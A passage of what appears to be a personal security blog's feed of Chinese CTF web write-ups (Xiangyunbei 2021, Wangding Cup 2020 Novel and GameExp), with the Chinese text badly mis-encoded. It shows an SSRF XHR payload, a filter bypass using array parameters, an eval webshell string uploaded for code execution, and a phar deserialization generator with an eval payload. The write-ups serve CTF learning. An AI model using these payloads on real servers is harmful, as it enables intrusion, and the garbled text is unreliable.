exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as request.open(&quot;GET&quot;,&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;) will result in a PDF document with the contents of &#x2F;etc&#x2F;passwd.</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥åˆ©ç”¨åˆ¶é€ pdfçš„åŠŸèƒ½æ¥å®ç°ssrfï¼ŒæŠŠflagç»™adminç”¨æˆ·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=1&quot;</span>, <span class="literal">true</span>);xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è€Œä¸”filenameå­—æ®µæ˜¯UNIQUEï¼Œéœ€è¦ä¸èƒ½ç›´æ¥flagï¼Œç”¨./flagã€‚</p><p>ä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯è¿™ä¸ªè¿‡æ»¤ï¼š</p><pre><code>if ( content == &#39;&#39; || content.includes(&#39;&lt;&#39;) || content.includes(&#39;&gt;&#39;) || content.includes(&#39;/&#39;) || content.includes(&#39;script&#39;) || content.includes(&#39;on&#39;))&#123;    // even admin can&#39;t be trusted right ? :)      return res.render(&#39;admin&#39;, &#123; error: &#39;Forbidden word ğŸ¤¬&#39;&#125;);&#125; else &#123;</code></pre><p>å½“æ—¶è‡ªå·±å°±å¡åœ¨äº†è¿™é‡Œï¼Œä¸çŸ¥é“æ€ä¹ˆç»•è¿‡ã€‚å…³é”®å°±åœ¨äºnode.jsçš„å¼±ç±»å‹å’Œphpçš„å¼±ç±»å‹æœ‰æ‰€ä¸åŒã€‚jsä¸­æ•°ç»„å’Œå­—ç¬¦ä¸²æ‹¼æ¥çš„è¯ï¼Œæ¯”å¦‚[â€œhelloâ€]+â€worldâ€ï¼Œå¾—åˆ°çš„æ˜¯helloworldï¼Œè€Œphpé‡Œç¡®å®Arrayworldã€‚ä¹Ÿæ˜¯å› ä¸ºæ·±å—phpçš„å½±å“ï¼Œæ‰€ä»¥æ²¡æƒ³åˆ°è¿™é‡Œå¯ä»¥ç”¨æ•°ç»„æ¥ç»•è¿‡ï¼Œè®°å¾—URLç¼–ç </p><p>ç„¶åæˆ‘æ˜¯ä¸¢è¿›bpé‡Œï¼Œåªéœ€è¦contentæ”¹æˆcontent[],ä¼ æ•°ç»„</p><p><img src="/2021/09/07/buu/21/image-20210908115802410.png" alt="image-20210908115802410"></p><p><img src="/2021/09/07/buu/21/image-20210908120122404.png" alt="image-20210908120122404"></p><p>å‡ºç°è¿™ä¸ªé¡µé¢å°±æ˜¯æˆåŠŸ</p><p><img src="/2021/09/07/buu/21/image-20210908120634020.png" alt="image-20210908120634020"></p><p>æ‰“å¼€åå°±æœ‰flag</p><p><img src="/2021/09/07/buu/21/image-20210908120715884.png" alt="image-20210908120715884"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/rfrder/article/details/119914746&quot;&gt;ç¥¥äº‘æ¯2021 Webå¤ç°_fengçš„åšå®¢-CSDNåšå®¢&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[ç¥¥äº‘æ¯2021 web wp | Z3ratu1â€™s blog</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>phpä»£ç å®¡è®¡(ä¸‰)</title>
    <link href="http://daweitech.github.io/2021/09/05/php/2/"/>
    <id>http://daweitech.github.io/2021/09/05/php/2/</id>
    <published>2021-09-05T12:48:43.000Z</published>
    <updated>2021-09-05T13:04:00.433Z</updated>
    
    <content type="html"><![CDATA[<p> è¿™æ˜¯ä¸€æ¬¡å¯¹å•ç‹¬æ–‡ç« çš„åˆ†æ</p><p>æ¥è‡ªäºå®‰å…¨å®¢ï¼š</p><p><a href="https://www.anquanke.com/post/id/250537">ThinkPHP 3.2.3 æ¼æ´å¤ç° - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; è¿™æ˜¯ä¸€æ¬¡å¯¹å•ç‹¬æ–‡ç« çš„åˆ†æ&lt;/p&gt;
&lt;p&gt;æ¥è‡ªäºå®‰å…¨å®¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/250537&quot;&gt;ThinkPHP 3.2.3 æ¼æ´å¤ç° - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)&lt;/a&gt;</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>ç½‘é¼æ¯ 2020 æ€»å†³èµ› Novel&amp;GameExp</title>
    <link href="http://daweitech.github.io/2021/09/04/buu/20/"/>
    <id>http://daweitech.github.io/2021/09/04/buu/20/</id>
    <published>2021-09-04T07:24:15.000Z</published>
    <updated>2021-09-07T12:35:03.912Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Novel"><a href="#Novel" class="headerlink" title="Novel:"></a>Novel:</h4><p>å‚è€ƒåšå®¢ï¼š</p><p><a href="https://www.cnblogs.com/W4nder/p/14078695.html">ç½‘é¼æ¯2020çº¿ä¸‹web - W4nder - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://mount4in.github.io/2020/12/08/2020%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEwriteup/">2020ç¬¬äºŒå±Šç½‘é¼æ¯åŠå†³èµ›Webé¢˜ç›®writeup | Mount4in</a></p><p>åœ¨buuä¸Šä¸‹è½½äº†æºæ–‡ä»¶</p><p><img src="/2021/09/04/buu/20/image-20210905094734716.png" alt="image-20210905094734716"></p><p>å…ˆçœ‹çœ‹index.php</p><p>æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">defined(&#39;DS&#39;) or define(&#39;DS&#39;, DIRECTORY_SEPARATOR);</span><br><span class="line">define(&#39;APP_DIR&#39;, realpath(&#39;.&#x2F;&#39;));</span><br><span class="line">error_reporting(0);</span><br><span class="line">function autoload_class($class)&#123;</span><br><span class="line">foreach(array(&#39;class&#39;) as $dir)&#123;</span><br><span class="line">$file &#x3D; APP_DIR.DS.$dir.DS.$class.&#39;.class.php&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $file;</span><br><span class="line">if(file_exists($file))&#123;</span><br><span class="line">&#x2F;&#x2F; echo $file;</span><br><span class="line">include_once $file;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function upload($config)&#123;</span><br><span class="line">$upload_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">foreach(array(&#39;file&#39;,&#39;method&#39;) as $param)&#123;</span><br><span class="line">$upload_config[&#39;data&#39;][$param]&#x3D;$config[$param];</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; var_dump($upload_config);</span><br><span class="line">return $upload_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function home($config)&#123;</span><br><span class="line">$home_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">$home_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">return $home_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function back($config)&#123;</span><br><span class="line">$copy_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;filename&#39;]&#x3D;$config[&#39;post&#39;][&#39;filename&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;dest&#39;]&#x3D;$config[&#39;post&#39;][&#39;dest&#39;];</span><br><span class="line">return $copy_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">spl_autoload_register(&#39;autoload_class&#39;);</span><br><span class="line"></span><br><span class="line">$request&#x3D;isset($_SERVER[&#39;REQUEST_URI&#39;])?$_SERVER[&#39;REQUEST_URI&#39;]:&#39;&#x2F;&#39;;</span><br><span class="line"></span><br><span class="line">$config[&#39;get&#39;]&#x3D;$_GET;</span><br><span class="line">$config[&#39;post&#39;]&#x3D;$_POST;</span><br><span class="line">$config[&#39;file&#39;]&#x3D;$_FILES;</span><br><span class="line"></span><br><span class="line">$parameters&#x3D;explode(&#39;&#x2F;&#39;,explode(&#39;?&#39;, $request)[0]);</span><br><span class="line">$class&#x3D;(isset($parameters[1]) &amp;&amp; !empty($parameters[1]))?$parameters[1]:&#39;home&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$method&#x3D;(isset($parameters[2]) &amp;&amp; !empty($parameters[2]))?$parameters[2]:&#39;index&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $method;</span><br><span class="line"></span><br><span class="line">$config[&#39;class&#39;]&#x3D;$class;</span><br><span class="line">$config[&#39;method&#39;]&#x3D;$method;</span><br><span class="line"></span><br><span class="line">if(!empty($class))&#123;</span><br><span class="line">if(in_array($class, array(&#39;upload&#39;,&#39;home&#39;,&#39;back&#39;)))&#123;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$class_init_config&#x3D;call_user_func($class, $config);</span><br><span class="line">&#x2F;&#x2F; print_r($class_init_config);</span><br><span class="line">new $class_init_config[&#39;class&#39;]($class_init_config[&#39;data&#39;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.phpä¸­å®ç°äº†æœ‰ä¸€ä¸ªç±»è‡ªåŠ¨åŠ è½½ï¼Œå¯ä»¥ä»¥<code>http://ip/class/method</code>çš„å½¢å¼å»è°ƒç”¨å¯¹åº”ç±»çš„å‡½æ•°</p><p>//ç±»è‡ªåŠ¨åŠ è½½</p><p><a href="https://www.php.net/manual/zh/language.oop5.autoload.php">https://www.php.net/manual/zh/language.oop5.autoload.php</a></p><p><img src="/2021/09/04/buu/20/image-20210905095559300.png" alt="image-20210905095559300"></p><p><img src="/2021/09/04/buu/20/image-20210905095718327.png" alt="image-20210905095718327"></p><p>ç„¶ååœ¨<code>class</code>æ–‡ä»¶å¤¹ä¸­æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«ä¸º</p><p><code>home.class.php</code>ã€ <code>upload.class.php</code> ã€<code>back.class.php</code>ï¼Œåˆ†åˆ«å¯¹åº”ä¸»é¡µã€ä¸Šä¼ å’Œå¤‡ä»½åŠŸèƒ½çš„å®ç°ï¼Œæ¥ä¸‹æ¥å®¡è®¡è¿™ä¸‰ä¸ªæ–‡ä»¶</p><p>æˆ‘ä»¬é‡‡ç”¨åˆ†è€Œç½®ä¹‹æ¥åˆ†æ</p><p>1.upload.class.phpï¼Œä¸Šä¼ åŠŸèƒ½</p><p><img src="/2021/09/04/buu/20/image-20210905100016508.png" alt="image-20210905100016508"></p><p>æ–‡ä»¶è¢«ä¸Šä¼ åˆ°<code>profile</code>ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åå¯æ§ï¼Œä½†æ˜¯å…¶åç¼€è¿›è¡Œäº†é™åˆ¶ï¼Œåªèƒ½ç”¨txtï¼Œç„¶åå°±æ˜¯å¤§å°é™åˆ¶ã€‚</p><p>PHP in_array() å‡½æ•°</p><p>å®šä¹‰å’Œç”¨æ³•</p><p>in_array() å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>å¦‚æœ <em>search</em> å‚æ•°æ˜¯å­—ç¬¦ä¸²ä¸” <em>type</em> å‚æ•°è¢«è®¾ç½®ä¸º TRUEï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚</td></tr><tr><td align="left"><em>array</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚</td></tr><tr><td align="left"><em>type</em></td><td align="left">å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚</td></tr></tbody></table><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Bill&quot;, &quot;Steve&quot;, &quot;Mark&quot;, &quot;David&quot;);</span><br><span class="line"></span><br><span class="line">if (in_array(&quot;Mark&quot;, $people))</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;åŒ¹é…å·²æ‰¾åˆ°&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;åŒ¹é…æœªæ‰¾åˆ°&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>echo â€œåŒ¹é…å·²æ‰¾åˆ°â€</p><p>2.backup.class.php,å¤‡ä»½åŠŸèƒ½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class back&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $method;</span><br><span class="line">    public $dest;</span><br><span class="line"></span><br><span class="line">    function __construct($config)&#123;</span><br><span class="line">        $this-&gt;filename&#x3D;$config[&#39;filename&#39;];</span><br><span class="line">        $this-&gt;method&#x3D;$config[&#39;method&#39;];</span><br><span class="line">        $this-&gt;dest&#x3D;$config[&#39;dest&#39;];</span><br><span class="line">        if(in_array($this-&gt;method, array(&#39;backup&#39;)))&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;method&#125;($this-&gt;filename, $this-&gt;dest);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function backup($filename, $dest)&#123;</span><br><span class="line">        $filename&#x3D;&#39;profile&#x2F;&#39;.$filename;</span><br><span class="line">        if(file_exists($filename))&#123;</span><br><span class="line">            $content&#x3D;htmlspecialchars(file_get_contents($filename),ENT_QUOTES);</span><br><span class="line">            $password&#x3D;$this-&gt;random_code();</span><br><span class="line">            $r[&#39;path&#39;]&#x3D;$this-&gt;_write($dest, $this-&gt;_create($password, $content));</span><br><span class="line">            $r[&#39;password&#39;]&#x3D;$password;</span><br><span class="line">            echo json_encode($r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;* å…ˆéªŒè¯ä¿è¯ä¸ºå¤‡ä»½æ–‡ä»¶å,å†ä¿å­˜ä¸ºç§è—æ–‡ä»¶ *&#x2F;</span><br><span class="line">    private function _write($dest, $content)&#123;</span><br><span class="line">        $f1&#x3D;$dest;</span><br><span class="line">        $f2&#x3D;&#39;private&#x2F;&#39;.$this-&gt;random_code(10).&quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">        $stream_f1 &#x3D; fopen($f1, &#39;w+&#39;);</span><br><span class="line">        fwrite($stream_f1, $content);</span><br><span class="line">        rewind($stream_f1);</span><br><span class="line">        $f1_read&#x3D;fread($stream_f1, 3000);</span><br><span class="line"></span><br><span class="line">        preg_match(&#39;&#x2F;^&lt;\?php \$_GET\[\&quot;password\&quot;\]&#x3D;&#x3D;&#x3D;\&quot;[a-zA-Z0-9]&#123;8&#125;\&quot;\?print\(\&quot;.*\&quot;\):exit\(\); $&#x2F;s&#39;, $f1_read, $matches);</span><br><span class="line"></span><br><span class="line">        if(!empty($matches[0]))&#123;</span><br><span class="line">            copy($f1,$f2);</span><br><span class="line">            fclose($stream_f1);   </span><br><span class="line">            return $f2;     </span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            fwrite($stream_f1, &#39;&lt;?php exit(); ?&gt;&#39;);</span><br><span class="line">            fclose($stream_f1);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function _create($password, $content)&#123;</span><br><span class="line">        $_content&#x3D;&#39;&lt;?php $_GET[&quot;password&quot;]&#x3D;&#x3D;&#x3D;&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;;</span><br><span class="line">        return $_content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function random_code($length &#x3D; 8,$chars &#x3D; null)&#123;</span><br><span class="line">        if(empty($chars))&#123;</span><br><span class="line">            $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $count &#x3D; strlen($chars) - 1;</span><br><span class="line">        $code &#x3D; &#39;&#39;;</span><br><span class="line">        while( strlen($code) &lt; $length)&#123;</span><br><span class="line">            $code .&#x3D; substr($chars,rand(0,$count),1);</span><br><span class="line">        &#125;</span><br><span class="line">        return $code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºé¦–å…ˆå°†<code>$filename</code>æ‹¼æ¥åˆ°<code>profile/</code>ï¼Œç„¶åæ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨ï¼Œå°†æ–‡ä»¶å†…å®¹è¯»å‡ºæ¥è¿›è¡Œhtmlç¼–ç ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªéšæœºçš„å­—ç¬¦ä¸²ä½œä¸ºè¯»å–æ–‡ä»¶å†…å®¹çš„å¯†ç ï¼Œ</p><p>ä¹‹åè°ƒç”¨<code>_create()</code>å‡½æ•°ï¼Œå°†å¯†ç å’Œhtmlç¼–ç åçš„æ–‡ä»¶å†…å®¹ï¼Œæ‹¼æ¥åˆ°<code>&#39;&lt;?php $_GET[&quot;password&quot;]===&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;</code>é‡Œï¼Œ</p><p>ä¹‹åè°ƒç”¨<code>_write()</code>å‡½æ•°ï¼Œå°†ä¸Šé¢è¿™æ®µphpä»£ç å†™è¿›<code>private</code>ç›®å½•ï¼Œç„¶åå¯¹æ–‡ä»¶å†…å®¹å†…å®¹è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„æ£€æµ‹ï¼Œè‹¥é€šè¿‡æ£€æµ‹,å°†æ–‡ä»¶å†…å®¹å†™è¿›<code>$dest</code>ï¼Œå¹¶å¤åˆ¶ä¸€ä»½åˆ°<code>$f2</code>ï¼Œè‹¥æ²¡æœ‰é€šè¿‡æ£€æµ‹ï¼Œåˆ™åœ¨<code>$dest</code>ä¸­å†™å…¥<code>&lt;?php exit(); ?&gt;</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç†æ¸…ç¨‹åºå¤§ä½“æµç¨‹åï¼Œå¤§è‡´çš„æ”»å‡»æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªtxtçš„æ–‡ä»¶ï¼Œç„¶åå†é€šè¿‡backç”Ÿæˆphpæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;eval($_GET[0])&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œå¤‡ä»½ï¼Œç”Ÿæˆphpæ–‡ä»¶</p><p><img src="/2021/09/04/buu/20/image-20210905101422842.png" alt="image-20210905101422842"></p><p>æ‰§è¡Œå‚æ•°0</p><p><img src="/2021/09/04/buu/20/image-20210905101726252.png" alt="image-20210905101726252"></p><h4 id="GameExp"><a href="#GameExp" class="headerlink" title="GameExp:"></a>GameExp:</h4><p>è¿™é¢˜ä¹Ÿæ˜¯å‘äº†å¾ˆä¹…å•Š</p><p>é¦–å…ˆæ˜¯ä¸ºäº†åœ¨ç›®å½•ä¸‹ç”Ÿæˆpharæ–‡ä»¶</p><p>éœ€è¦ä¿®æ”¹é…ç½®php.iniï¼Œæ‰¾äº†å¥½ä¹…æ‰è§£å†³ï¼š</p><p><a href="https://blog.csdn.net/weixin_35835030/article/details/116174720">https://blog.csdn.net/weixin_35835030/article/details/116174720</a></p><p>åˆ›å»ºcreatephar.phpæ–‡ä»¶ï¼ˆè¿™ä»¥åå¯ä»¥ç”¨ä½œpharæ–‡ä»¶è§£é¢˜æ¨¡æ¿ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> $output = <span class="string">&#x27;eval($_REQUEST[0]);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifâ½‚ä»¶å¤´</span></span><br><span class="line">$o = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†â¾ƒå®šä¹‰meta-dataå­˜â¼Šmanifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.jpg&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„â½‚ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åâ¾ƒåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æœ‰php.exeçš„ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php  createphar.php</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆphp.phar,ç„¶åé‡å‘½åä¸ºphp.gif</p><p>ç„¶ååœ¨registeré¡µé¢æ³¨å†Œæ—¶ä¸Šä¼ è¯¥æ–‡ä»¶</p><p>æ³¨å†Œåéšæ„ï¼Œè¿™é‡Œæˆ‘ç”¨lex</p><p><img src="/2021/09/04/buu/20/image-20210907174315906.png" alt="image-20210907174315906"></p><p>è¿˜å¯ä»¥éªŒè¯ä¸€ä¸‹æ˜¯å¦ä¸Šä¼ æˆåŠŸ</p><p><img src="/2021/09/04/buu/20/image-20210907174611006.png" alt="image-20210907174611006"></p><p>æ¥ç€é‡æ–°æ³¨å†Œä¸€æ¬¡ï¼Œå¹¶ä¸”è¦ç”¨æŠ“åŒ…ä¿®æ”¹ï¼Œç”¨æˆ·åæ³¨æ„è¦ç”¨åˆšåˆšæ³¨å†Œçš„ï¼Œ</p><p>æ¥è§¦å‘ååºåˆ—åŒ–,åœ¨postå¢æ·»å‘½ä»¤</p><p><img src="/2021/09/04/buu/20/image-20210907175822286.png" alt="image-20210907175822286"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Novel&quot;&gt;&lt;a href=&quot;#Novel&quot; class=&quot;headerlink&quot; title=&quot;Novel:&quot;&gt;&lt;/a&gt;Novel:&lt;/h4&gt;&lt;p&gt;å‚è€ƒåšå®¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/W4nder/p/1</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020 Ezpop</title>
    <link href="http://daweitech.github.io/2021/09/03/buu/19/"/>
    <id>http://daweitech.github.io/2021/09/03/buu/19/</id>
    <published>2021-09-03T07:48:25.000Z</published>
    <updated>2021-09-07T12:35:08.633Z</updated>
    
